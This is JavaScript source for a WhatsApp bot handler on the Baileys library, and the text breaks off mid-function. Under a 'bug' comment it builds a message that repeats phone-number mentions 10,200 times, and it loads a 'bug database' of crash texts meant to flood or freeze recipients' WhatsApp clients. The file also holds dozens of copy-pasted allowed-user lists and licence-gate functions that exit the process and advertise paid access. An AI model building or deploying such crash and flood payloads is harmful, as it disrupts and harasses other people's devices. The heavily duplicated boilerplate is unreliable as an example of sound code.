require("./settings")
const { generateMessageIDV2, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");

module.exports = async (Avishka, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Avishka.user.id.split(':')[0]+'@s.whatsapp.net' || Avishka.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Avishka.decodeJid(Avishka.user.id)
const senderNumber = sender.split('@')[0]
const orgkaya = JSON.parse(fs.readFileSync('./database/owner.json'))
const kontributor = JSON.parse(fs.readFileSync('./database/owner.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await Avishka.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//====================================\\
//bug
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "🦄 REAL-KING-AVI 🦄") + "\n\n\n";
    jidds = [];
    xeontex += "*~@916909137213~*\n*🦄*\n*~@919366316018~*\n".repeat(10200);
    jidds.push("916909137213@s.whatsapp.net", "919366316018@s.whatsapp.net");
//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const { xeontext11 } = require('./69/xeontext11')
const { xeonbeta1, xeonbeta2, xeonyx } = require("./69/xeontext13.js")
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
// No Need to Do Anything If You Don't Want Errors

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
 
 function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return Avishka.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return Avishka.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//group chat msg by xeon
const replygcxeon = (teks) => {
	Avishka.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/8ynou2.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                            }
                            }
                        }, {
                        quoted: m
                    })

}

const avimatch1 = m.sender;
const avimatch2 = m.sender;
const avimatch3 = m.sender;
const avimatch4 = m.sender;
const avimatch5 = m.sender;
const avimatch6 = m.sender;
const avimatch7 = m.sender;
const avimatch8 = m.sender;
const avimatch9 = m.sender;
const avimatch10 = m.sender;
const avimatch11 = m.sender;
const avimatch12 = m.sender;
const avimatch13 = m.sender;
const avimatch14 = m.sender;
const avimatch15 = m.sender;
const avimatch16 = m.sender;
const avimatch17 = m.sender;
const avimatch18 = m.sender;
const avimatch19 = m.sender;
const avimatch20 = m.sender;
const avimatch21 = m.sender;
const avimatch22 = m.sender;
const avimatch23 = m.sender;
const avimatch24 = m.sender;
const avimatch25 = m.sender;
const avimatch26 = m.sender;
const avimatch27 = m.sender;
const avimatch28 = m.sender;
const avimatch29 = m.sender;
const avimatch30 = m.sender;
const avimatch31 = m.sender;
const avimatch32 = m.sender;
const avimatch33 = m.sender;
const avimatch34 = m.sender;
const avimatch35 = m.sender;
const avimatch36 = m.sender;
const avimatch37 = m.sender;
const avimatch38 = m.sender;

const allowedUsers1 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers2 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers3 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers4 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers5 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers6 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers7 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers8 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers9 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers10 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers11 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers12 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers13 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers14 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers15 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers16 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers17 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers18 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers19 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers20 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers21 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers22 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers23 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers24 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers25 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers26 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers27 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers28 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers29 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers30 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers31 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers32 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers33 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers34 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


const allowedUsers35 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];

const allowedUsers36 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];

const allowedUsers37 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];

const allowedUsers38 = [
  '94772836332@s.whatsapp.net',
  '94787672517@s.whatsapp.net'
];


async function XeonyDatabase(){
  	console.log(chalk.bgWhite(chalk.redBright('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n')));
   replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
   }
async function xeonydatabase(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}

async function xeonydatabase1(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase2(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase3(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase4(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase5(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase6(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase7(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase8(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase9(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase10(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase11(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase12(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase13(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase14(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase15(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase16(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase17(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase18(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase19(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase20(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase21(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase22(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase23(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase24(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase25(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase26(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase27(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase28(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase29(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase30(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase31(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase32(){
